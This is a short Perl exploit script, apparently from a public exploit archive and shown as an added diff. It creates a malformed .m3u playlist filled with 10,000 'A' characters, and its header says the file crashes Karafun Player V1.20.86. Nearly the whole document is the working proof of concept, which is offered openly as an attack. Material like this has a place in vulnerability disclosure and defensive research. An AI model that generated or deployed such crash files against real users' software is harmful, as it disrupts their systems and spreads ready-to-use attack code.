@@ -1,0 +1,18 @@
+# 
+# Exploit Title: Karafun Player V1.20.86 .m3u file Denial of Service
+# Date: 2012.6.15
+# Vulnerability Discovered & Exploit by Styxosaurus
+# Styxosaurus [at] gmail [dot] com
+#
+# Software Link: http://www.karafun.com/karaokeplayer/
+# Version: V1.20.86
+# Description:
+#             Karafun will crash and not responding when trying to close it after
+#             runs a special crafted .m3u file.
+
+my $JUNK= "A" x 10000;
+my $FILE="Karafun.m3u";
+open(my $FILE, ">$FILE") or die "Cannot open $file: $!";
+print $FILE $JUNK;
+close($FILE);
+
